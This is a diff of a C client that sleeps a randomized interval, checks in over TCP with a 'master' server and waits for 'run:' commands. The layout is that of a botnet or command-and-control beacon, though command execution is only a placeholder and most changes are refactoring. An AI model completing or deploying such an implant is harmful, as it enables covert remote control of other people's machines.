@@ -11,7 +11,7 @@ int main(int argc, char **argv){
             int sleep_time = (rand() % 2) + 3;
             printf("Sleeping for %d seconds... ",sleep_time);
         #else
-            int sleep_time = (rand() % 3600) + 300;
+            int sleep_time = (rand() % SLEEP_MAX) + SLEEP_BASE;
         #endif
 
         #if defined(__apple__) || defined(__linux__) || defined(__unix__)
@@ -33,7 +33,7 @@ int main(int argc, char **argv){
         if (data)
             free(data);
         data = NULL;
-        if (!strncmp(resp, "run:", 4)){
+        if (!strncmp(resp, "run:", 4)) {
             puts("Run command here");
             data = (char*)malloc(strlen("Triggered")+1);
             strcpy(data, "Triggered");
@@ -54,17 +54,17 @@ int master_init(struct sockaddr_in *master) {
         master->sin_addr.s_addr = inet_addr( MASTER_IP );
         master->sin_port = htons(MASTER_PORT);
     #elif __windows__
-
+        // TODO
     #endif
     return 0;
 }
 
 char *master_checkin(struct sockaddr_in master, char *data){
-    char *server_reply = (char *)malloc(2000);
+    char *server_reply = (char *)malloc(MASTER_RECV_SIZE);
     int recv_size;
     #if defined __apple__ || defined(__linux__) || defined(__unix__)
         // do standard sockets
-        bzero(server_reply, 2000);
+        bzero(server_reply, MASTER_RECV_SIZE);
         int s;
         if ((s = socket(PF_INET, SOCK_STREAM, IPPROTO_TCP)) < 0) {
             #ifdef CLIENT_DEBUG
@@ -80,13 +80,11 @@ char *master_checkin(struct sockaddr_in master, char *data){
             return server_reply;
         }
         // Send data
-        if(data && send(s , data , strlen(data) , 0) < 0)
-        {
+        if(data && send(s , data , strlen(data) , 0) < 0) {
             return server_reply; //something failed :(
         }
         //Receive a reply from the server
-        if((recv_size = recv(s , server_reply , 2000 , 0)) < 0)
-        {
+        if((recv_size = recv(s , server_reply , MASTER_RECV_SIZE , 0)) < 0) {
             puts("recv failed");
         }
     #elif __windows__
@@ -96,8 +94,7 @@ char *master_checkin(struct sockaddr_in master, char *data){
         #ifdef CLIENT_DEBUG
             printf("[master_checkin] Initialising...");
         #endif
-        if (WSAStartup(MAKEWORD(2,2),&wsa) != 0)
-        {
+        if (WSAStartup(MAKEWORD(2,2),&wsa) != 0) {
             #ifdef CLIENT_DEBUG
                 printf("Failed. Error: %d",WSAGetLastError());
             #endif
@@ -105,8 +102,7 @@ char *master_checkin(struct sockaddr_in master, char *data){
         }
 
         //Create a socket
-        if((s = socket( AF_INET , SOCK_STREAM , 0 )) == INVALID_SOCKET)
-        {
+        if((s = socket( AF_INET , SOCK_STREAM , 0 )) == INVALID_SOCKET) {
             #ifdef CLIENT_DEBUG
                 printf("Could not create socket : %d" , WSAGetLastError());
             #endif
@@ -114,19 +110,16 @@ char *master_checkin(struct sockaddr_in master, char *data){
         }
 
         // Connect to master
-        if (connect(s , (struct sockaddr *)&master , sizeof(master)) < 0)
-        {
+        if (connect(s , (struct sockaddr *)&master , sizeof(master)) < 0) {
             return server_reply;
         }
 
         // Send data
-        if( send(s , data , strlen(data) , 0) == SOCKET_ERROR)
-        {
+        if( send(s , data , strlen(data) , 0) == SOCKET_ERROR) {
             return server_reply;
         }
         //Receive a reply from the server
-        if((recv_size = recv(s , server_reply , 2000 , 0)) == SOCKET_ERROR)
-        {
+        if((recv_size = recv(s , server_reply , MASTER_RECV_SIZE , 0)) == SOCKET_ERROR) {
             puts("recv failed");
         }
         //Add a NULL terminating character to make it a proper string before printing
